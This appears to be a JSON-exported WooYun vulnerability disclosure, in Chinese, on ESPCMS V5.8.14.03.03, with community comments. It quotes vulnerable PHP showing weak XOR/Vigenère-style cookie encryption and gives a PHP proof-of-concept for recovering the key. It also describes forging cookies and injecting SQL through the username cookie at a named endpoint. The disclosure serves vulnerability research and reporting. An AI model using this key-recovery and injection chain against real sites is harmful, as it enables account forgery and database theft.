{"id": 1887, "wybug_id": "wooyun-2014-062528", "wybug_title": "ESPCMS最新 V5.8.14.03.03 UTF8 正式版暴力注入", "wybug_corp": "易思ESPCMS企业网站管理系统", "wybug_author": "索马里的海贼", "wybug_date": "2014-05-27 16:42", "wybug_open_date": "2014-08-22 16:44", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-01：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-22：\t细节向公众公开  简要描述： 弱加密算法的悲剧 伪造任意用户登录 注入 一系列问题 详细说明：  /public/class_dbmysql.php行144\nfunction eccode($string, $operation = 'DECODE', $key = '@LFK24s224%@safS3s%1f%', $mcrype = true) {\t$result = null;\tif ($operation == 'ENCODE') {\t\tfor ($i = 0; $i < strlen($string); $i++) {\t\t\t$char = substr($string, $i, 1);\t\t\t$keychar = substr($key, ($i % strlen($key)) - 1, 1);\t\t\t$char = chr(ord($char) + ord($keychar)); //看到这应该懂了\t\t\t$result.=$char;\t\t}\t\t$result = base64_encode($result);\t\t$result = str_replace(array('+', '/', '='), array('-', '_', ''), $result);\t} elseif ($operation == 'DECODE') {\t\t$data = str_replace(array('-', '_'), array('+', '/'), $string);\t\t$mod4 = strlen($data) % 4;\t\tif ($mod4) {\t\t\t$data .= substr('====', $mod4);\t\t}\t\t$string = base64_decode($data);\t\tfor ($i = 0; $i < strlen($string); $i++) {\t\t\t$char = substr($string, $i, 1);\t\t\t$keychar = substr($key, ($i % strlen($key)) - 1, 1);\t\t\t$char = chr(ord($char) - ord($keychar));\t\t\t$result.=$char;\t\t}\t}\treturn $result;}\n很明显用的维吉尼亚密码算法。这个算法。。。key 原始文本 结果 3个值互相交换位置都可以运算只要知道其中两个就能算出第三个，跟异或差不多。来看看cookie的处理：/interface/member.php 行109\n$this->fun->setcookie('ecisp_member_username', $this->fun->eccode($memberread['username'], 'ENCODE', db_pscode));$this->fun->setcookie('ecisp_member_info', $this->fun->eccode(\"$memberread[userid]|$memberread[alias]|$memberread[integral]|$memberread[mcid]|$memberread[email]|$memberread[lastip]|$ipadd|\" . md5($_SERVER['HTTP_USER_AGENT']) . '|' . md5(admin_ClassURL), 'ENCODE', db_pscode));\n可以看到 ecisp_member_info这个cookie是由 userid alias integral mcid email等等等等组合起来的 这里先不看后面那么多 因为密钥生成的时候指定长度为20~40 前面这些已经足够我们发挥了通过注册部分sql语句可以知道 integral默认为0 mcid默认为1 至于alias没有看到初始化的地方，反正这里进sql是null。所以ecisp_member_info的前面部分应该是userid||0|1|email密钥最长有40位，所以这里我们注册账号的时候填一个很长的email\n\n注册完成之后去个人中心的个人资料修改页面查看源码 能找到userid比如我的这个是3好了 完整的前半部分cookie就是\n3||0|1|22222222222222222222@baidu.com|\n然后查看当前的cookie 记下ecisp_member_info值 丢进POC\n\n得到这么一串东西2ed61aee0bba9ff5fa59652ed61aee0bba9ff5这里说明一下前面的加密算法$keychar = substr($key, ($i % strlen($key)) - 1, 1);这里可以看到 key不是从第一位开始加密的 当$i是0或者等于密钥长度的时候 $keychar = substr($key,-1,1) 取的是最后一位 再来看刚才那串东西\n2ed61aee0bba9ff5fa5965 2ed61aee0bba9ff5\n这里我加了个空格 可以看到5965之后就开始重复了第一位是最后一位（拗口）所以真正的密钥应该是 ed61aee0bba9ff5fa59652 查看一下配置文件验证 没错吧\n\n拿到这个key之后 就可以随意自己构造合法的cookie了可以利用的地方不少 我这里随便找了一个点/interface/messmain.php 函数in_ajaxlist()行43\nfunction inajaxlist(){……省略……$ec_member_username = $this->member_cookieview('username');if ($ec_member_username) {\t$reMem = $this->get_member($ec_member_username);\t$this->pagetemplate->assign('member', $reMem);}\nmember_cookieview()取到username之后丢给了get_member()先看member_cookieview()/public/class_connector.php 行401\nfunction member_cookieview($keyword = false) {\t\t$retrunstr = array();\t\t$retrunstr['username'] = $this->fun->eccode($this->fun->accept('ecisp_member_username', 'C'), 'DECODE', db_pscode);\t\t$user_info = explode('|', $this->fun->eccode($this->fun->accept('ecisp_member_info', 'C'), 'DECODE', db_pscode));\t\tlist($retrunstr['userid'], $retrunstr['alias'], $retrunstr['integral'], $retrunstr['mcid'], $retrunstr['email'], $retrunstr['lastip'], $retrunstr['ipadd'], $retrunstr['useragent'], $retrunstr['adminclassurl']) = $user_info;\t\t$retrunstr['userid'] = intval($retrunstr['userid']);\t\t$retrunstr['integral'] = intval($retrunstr['integral']);\t\t$retrunstr['mcid'] = intval($retrunstr['mcid']);\t\treturn !$keyword ? $retrunstr : $retrunstr[$keyword];\t}\n从cookie中取出之后直接return了 没过滤再看get_member()public/class_connector.php 行2141\nfunction get_member($username = null, $userid = 0, $returnname = null) {\t$db_table = db_prefix . 'member';\t$db_where = empty($username) ? \" WHERE userid=$userid\" : \" WHERE username='$username'\"; //username直接进查询\t$db_sql = \"SELECT * FROM $db_table $db_where\";\t$rsLIST = $this->db->fetch_first($db_sql);\tif (!empty($returnname)) {\t\treturn $rsLIST[$returnname];\t} else {\t\treturn $rsLIST;\t}}\n总的流程大概就是 cookie->eccode解密->sql; 整流程就通了   漏洞证明：  用获得的key来加密sql注入语句这里就加了个单引号\n\n修改cookie ecisp_member_username值为生成的字符串访问/index.php?ac=messmain&at=ajaxlist&did=1&ismess=1\n\n附上计算key的poc\n$text = \"\"; //原文$cookie = \"\"; //cookie$dict = \"0123456789abcdef\";$bincookie = base64_decode($cookie);for ($j=0; $j < strlen($text); $j++) { \tfor ($k=0; $k < 16; $k++) { \t\tif( chr( ord($bincookie[$j]) - ord($dict[$k]) ) == $text[$j] ){\t\t\techo $dict[$k];\t\t}\t}}\n   修复方案：  换个算法吧   版权声明：转载请注明来源 索马里的海贼@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-08-22 16:44 厂商回复：  漏洞Rank：13  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-05-27 16:47 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  算法问题研究研究坑挺多的啊    \n     2014-05-27 16:48 |    \t\tsecgov \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:3        | 安全审计，漏洞挖掘,WAF. 揭露漏洞有风险，...)\t\t \n  怎么又有大漏洞了。ESPCMS漏洞不断啊    \n     2014-05-28 10:27 |    \t\tviekst \t\t\t( 实习白帽子  |\t\t\t        Rank:64 漏洞数:11        )\t\t \n  这个算法问题一直没有修复。    \n     2014-06-18 17:28 |    \t\t寂寞的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:53        | 一切语言转汇编理论)\t\t \n  厉害啊    \n     2014-07-16 16:55 |    \t\t小飞 \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:12        | 挖洞对于16岁的我来说实在是太艰难了！10...)\t\t \n  真的很厉害、、、    \n     2014-08-22 17:54 |    \t\tIT偏执狂 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:3        | 禁锢我们的究竟是什么？)\t\t \n  危害等级：无影响厂商忽略    \n     2014-08-22 19:35 |    \t\tzhxs \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:19        | Jyhack-TeaM：http://bbs.jyhack.com/)\t\t \n  危害等级：无影响厂商忽略忽略时间：2014-06-01 16:43    \n     2014-08-22 23:16 |    \t\t飞扬风 \t\t\t( 普通白帽子  |\t\t\t        Rank:512 漏洞数:125        | 追求安全，热爱技术)\t\t \n  算法问题给这么多钱~    \n     2015-04-13 22:06 |    \t\tForever80s \t\t\t( 普通白帽子  |\t\t\t        Rank:820 漏洞数:110        )\t\t \n  漏大马甲了    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}